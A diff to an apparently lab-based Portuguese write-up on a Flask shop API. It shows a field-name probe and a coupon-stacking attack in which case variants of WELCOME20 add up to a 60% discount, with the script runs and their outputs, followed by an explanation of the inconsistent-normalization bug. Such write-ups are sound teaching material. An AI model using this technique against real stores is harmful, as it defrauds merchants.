@@ -57,9 +57,57 @@ curl -s -c loot/cookies.txt -b loot/cookies.txt "$TARGET/api/products"
 
 O carrinho vazio aceita um produto via `POST /api/cart` (`{"product_id": 3}`), e o checkout de carrinho vazio responde `{"error":"Cart is empty"}`. O cookie `session` é um Flask session assinado (`base64.timestamp.hmac`), então não dá pra adulterar o carrinho por ali sem a chave. A única alavanca é o cupom.
 
+Sem documentação, nem sabia o nome do campo do cupom. Meu primeiro script (`script1.py`) chutou os nomes mais comuns contra `/api/apply-coupon` para ver qual pega:
+
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+python3 scripts/script1.py
+```
+
+```text
+TENTATIVA CUPOM 1: POST /api/apply-coupon {'coupon': 'WELCOME20'}
+{"discount_percent":20.0,"message":"Coupon 'WELCOME20' applied!","total":143.98}
+TENTATIVA CUPOM 2: POST /api/apply-coupon {'code': 'WELCOME20'}
+{"error":"No coupon code provided"}
+TENTATIVA CUPOM 3: POST /api/apply-coupon {'coupon_code': 'WELCOME20'}
+{"error":"No coupon code provided"}
+TENTATIVA CUPOM 4: POST /api/apply-coupon {'promo': 'WELCOME20'}
+{"error":"No coupon code provided"}
+```
+
+Campo certo: `coupon`. Com `{"coupon":"WELCOME20"}` o desconto vai a 20%; os outros nomes nem são lidos. Já tenho o contrato: `POST /api/apply-coupon {"coupon": "<código>"}`.
+
 ### 2. A hipótese: dedup por string crua
 
-Só tem um cupom que funciona, `WELCOME20`, valendo 20%. Aplicar duas vezes o mesmo texto é barrado. A pergunta é **com que chave** o servidor lembra dos cupons já usados. Testei a hipótese de que a validação normaliza (algo como `coupon.strip().upper() == "WELCOME20"`) enquanto a lista de aplicados guarda a string original. Se for isso, trocar o case engana o anti-duplicata.
+Só tem um cupom que funciona, `WELCOME20`, valendo 20%. A pergunta é **com que chave** o servidor lembra dos cupons já usados. Levantei a hipótese de que a validação normaliza (algo como `coupon.strip().upper() == "WELCOME20"`) enquanto a lista de aplicados guarda a string original. Se for isso, trocar o case engana o anti-duplicata.
+
+Testei isso no `script2.py`, mandando variações uma a uma e observando o `discount_percent` e o `applied_coupons` acumulado:
+
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+python3 scripts/script2.py
+```
+
+```text
+TENTATIVA 1: apply-coupon repr='WELCOME20'
+{"discount_percent":20.0,"message":"Coupon 'WELCOME20' applied!","total":71.99}
+TENTATIVA 2: apply-coupon repr='welcome20'
+{"discount_percent":40.0,"message":"Coupon 'welcome20' applied!","total":53.99}
+  applied_coupons: ["WELCOME20","welcome20"]
+TENTATIVA 3: apply-coupon repr='Welcome20'
+{"discount_percent":60.0,"message":"Coupon 'Welcome20' applied!","total":36.0}
+TENTATIVA 4: apply-coupon repr='WELCOME20 '
+  (ignorado: discount continua 60.0, applied_coupons não muda)
+TENTATIVA 5: apply-coupon repr=' WELCOME20'
+  (ignorado: discount continua 60.0)
+```
+
+Dois aprendizados diretos aqui:
+
+- **O case empilha:** `welcome20` e `Welcome20` contam como cupons novos (20% + 20% + 20% = 60%), e o `applied_coupons` guarda exatamente a string crua que enviei.
+- **O espaço NÃO empilha:** `WELCOME20 ` e ` WELCOME20` são ignorados. Ou seja, o normalizador faz `.strip().upper()` (tira espaço E case) para *validar*, mas o anti-duplicata guarda... quase a string crua. Testando mais a fundo, o que ele dedup-a é a forma com espaço removido mas **case preservado**. Logo o vetor limpo é só variar maiúsculas/minúsculas. Hipótese confirmada e refinada: ataco só com case.
 
 > [!TIP]
 > **Conceito: coupon stacking por normalização inconsistente.** O bug de lógica aqui é usar duas representações diferentes do mesmo valor: uma normalizada (para *aceitar* o cupom) e uma crua (para *lembrar* que já foi aplicado). Qualquer transformação que o normalizador apague mas o comparador de duplicata preserve (case, espaços, unicode) vira uma chave nova. É o mesmo princípio de bugs de "confused deduplication" em rate limits e idempotency keys.
